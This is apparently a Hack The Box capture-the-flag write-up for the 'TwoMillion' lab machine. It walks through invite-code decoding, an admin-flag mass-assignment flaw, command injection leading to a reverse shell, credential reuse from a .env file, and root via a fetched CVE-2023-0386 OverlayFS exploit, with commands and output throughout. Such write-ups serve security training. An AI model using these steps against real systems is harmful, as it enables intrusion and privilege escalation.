---
title: HTB - TwoMillion
date: 2023-12-13
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, nmap, fullpwn, http, js, cve-2023-0386, curl, burp-suite, cve-2023-4911, xor, base64, url-encoding, cyberchef, rot13, zap, glibc]
img_path: /assets/htb/fullpwn/two_million/
published: true
image:
    path: room_banner.png
---

## Overview

|:-:|:-:|
|Machine|[TwoMillion](https://app.hackthebox.com/machines/TwoMillion)|
|Rank|Easy|
|Time|-|
|Focus|HTTP, Command Injection, CVEs|

## Information Gathering

```shell
sudo nmap -sS -A -Pn --min-rate 10000 twomillion -p-

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Webserver Enumeration

According to our Nmap results, the HTTP server redirects to the `2million.htb` domain, so we need to add it to our `/etc/hosts`:

```shell
# add domain to /etc/hosts
$ sudo nano /etc/hosts
```

![](etc_hosts.png){: .normal}

Now we can access it:

![](home.png)

## Initial Foothold

We can start by using ZAP's spider functionality:

![](zap_spider.png)

The `inviteapi.min.js` looks interesting, so let's visit it:

![](zap_request.png)

It looks like obfuscated JavaScript code. We can visit it via our browser to get the code as a one-liner and then use [js-beautify](https://beautifier.io/) to deobfuscate it:

![](invite_one-line.png)

![](js_beautify.png)

The code consists of two functions: `makeInviteCode()` and `verifyInviteCode()`. Following what the former function telling us to do:

```shell
# sent a POST request
$ curl http://2million.htb/api/v1/invite/how/to/generate -X POST
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

If we read the json file carefully, we can see that is encoded in ROT13, so we can decode it using [Cyberchef](https://gchq.github.io/CyberChef):

![](cyberchef.png)

There is another direction for a web request:

```shell
# sent a POST request
$ curl http://2million.htb\/api\/v1\/invite\/generate -X POST
{"0":200,"success":1,"data":{"code":"MjI1Tk8tSTM5RzMtMTBZM00tODFNU00=","format":"encoded"}}
```

This seems to be encoded in Base64, so we can directly decode it:

```shell
# decode string
echo MjI1Tk8tSTM5RzMtMTBZM00tODFNU00= | base64 -d
225NO-I39G3-10Y3M-81MSM
```

And we finally cracked the invite-code 🔓 !

![](register_dir.png)

Let's create an account and login:

![](logged_in.png)

One of the few menu items that work is the *Access* tab:

![](access_tab.png)

Clicking on the *Connection Pack* button and intercepting the request with Burp:

![](burp_generate.png)

After playing around with different API endpoints based on what we have, we notice that one reponds back with interesting information: 

```shell
$ curl http://2million.htb/api/v1/user/vpn/ -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqapgrpva'
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

```shell
$ curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqapgrpva
' | jq .
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Let's try calling some of them:

```shell
# check if acc is admin
$ curl http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqapgrpva'
{"message":false}
```

```shell
# check acc status
$ curl http://2million.htb/api/v1/user/auth -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmq
apgrpva'
{"loggedin":true,"username":"kuv4z","is_admin":0}
```

```shell
# PUT request
$ curl http://2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=f9ivlst
65ugt596tnmqapgrpva' -X PUT
{"status":"danger","message":"Invalid content type."}
```

Going back to Burp, intercepting the login request, and trying to reach the above endpoint:

![](login_request.png)

![](put_invalid_content.png)

Since we get an "*Invalid content type.*" message, we can try changing the `Content-Type` field of the request:

![](missing_email.png)

This worked, and now we are missing the `email` parameter, so let's add that:

![](missing_admin.png)

Let's add the `admin` parameter and set it to `1`:

![](admin_1.png)

Let's check if we managed to update our account with the admin status:

```shell
# check account status
$ curl http://2million.htb/api/v1/user/auth -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqapgrpva'
{"loggedin":true,"username":"test","is_admin":1}

# confirm admin status
curl http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqapgrpva'
{"message":true}
```

Since we have an admin account on our hands, we can try reaching the `/api/v1/admin/` endpoint we found previously:

![](admin_generate_content_type.png)

![](admin_generate_username.png)

![](random_userame.png)

We get the same response with any random username, so we might be able to input a payload there. Let's check for command execution first:

![](ci_sleep.png)

This worked, so let's input a reverse shell payload instead:  

![](rev_shell.png)

## Privilege Escalation

Let's start by upgrading our shell:

```shell
# upgrade shell
www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
$ stty raw -echo;fg
www-data@2million:~/html$ export TERM=xterm
```

Now we can better look what lies around us:

```shell
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Dec 13 11:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Dec 13 11:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views

www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Since we have some credentials, we can try switching to the `admin` user:

```shell
# switch to user admin
www-data@2million:~/html$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

# check our ID
admin@2million:/var/www/html$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)

# get the first flag
admin@2million:/var/www/html$ cat /home/admin/user.txt
```

After searching many directories, SUID files, etc., we mange to find something of interest:

```shell
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

We can check the OS's kernel version as follows:

```shell
# check kernel version
admin@2million:/var/mail$ uname -r
5.15.70-051570-generic
```

Googling for "*5.15.70-051570-generic vulnerabilities overlay fs*" we find an [article](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) which explains the CVE and also includes a link to a [PoC](https://github.com/sxlmnwb/CVE-2023-0386):

![](cve_google.png)

In order to use the PoC, we must download the required files, transfer and execute them to the target, and then open a second connection with the target in order to execute the second command from a different terminal. We can achieve the latter using SSH, hoping that the same credentials will work:

```shell
# downlading the required PoC files
$ sudo git clone https://github.com/sxlmnwb/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 13 (delta 2), reused 13 (delta 2), pack-reused 0
Receiving objects: 100% (13/13), 8.89 KiB | 8.89 MiB/s, done.
Resolving deltas: 100% (2/2), done.

# compressing the directory
$ tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386/
# creating a new directory
$ mkdir www
# moving file into the new directory
$ mv CVE-2023-0386.tar.bz2 www
# moving within the directory
$ cd www
# launching a python HTTP server
python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```shell
# move to directory in which we have write access
admin@2million:/home$ cd /tmp
# download the file
admin@2million:/tmp$ wget http://10.10.14.10:8888/CVE-2023-0386.tar.bz2
--2023-12-13 12:09:27--  http://10.10.14.10:8888/CVE-2023-0386.tar.bz2
Connecting to 10.10.14.10:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 29756 (29K) [application/x-bzip2]
Saving to: ‘CVE-2023-0386.tar.bz2’

CVE-2023-0386.tar.b 100%[===================>]  29.06K  --.-KB/s    in 0.05s

2023-12-13 12:09:27 (606 KB/s) - ‘CVE-2023-0386.tar.bz2’ saved [29756/29756]
# unzip the file
admin@2million:/tmp$ tar -xjvf CVE-2023-0386.tar.bz2
# move into the required directory
admin@2million:/tmp$ cd CVE-2023-0386/
# execute the PoC's command
admin@2million:/tmp/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Now we have to establish a second connection with the target and execute the second command:

```shell
# log into SSH using the same credentials
$  ssh admin@10.10.11.221
# move within the required directory
admin@2million:/tmp$ cd /tmp/CVE-2023-0386/
# execute the PoC's command
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Dec 13 12:18 .
drwxr-xr-x 6 root   root     4096 Dec 13 12:18 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
# check account's ID
root@2million:/tmp/CVE-2023-0386# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
# get root flag
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
```

![](twomillion_pwned.png){: width="60%" .normal}

## Extra

There is another file within the `/root` directory:

```shell
# list files
root@2million:/root# ls
root.txt  snap  thank_you.json
# display file's contents
root@2million:/root# cat thank_you.json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

This string is URL-encoded, so we can URL-decode it on Cyberchef:

![](url_decode.png)

The resulting output is encoded in hex:

![](hex_decode.png)

This time the output is encoded in XOR (using an encryption key) and Base64:

![](base64_xor_decode.png)

## Alternative Privilege Escalation

On the machine's guided mode it asks us about the `GLIBC` version, which we can find as follows:

```shell
# check GLIBC version
root@2million:/root# ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

There is the vulnerability with [CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911) associated with that, as well as a [PoC](https://github.com/leesh3288/CVE-2023-4911) which we can use to perform Privilege Escalation.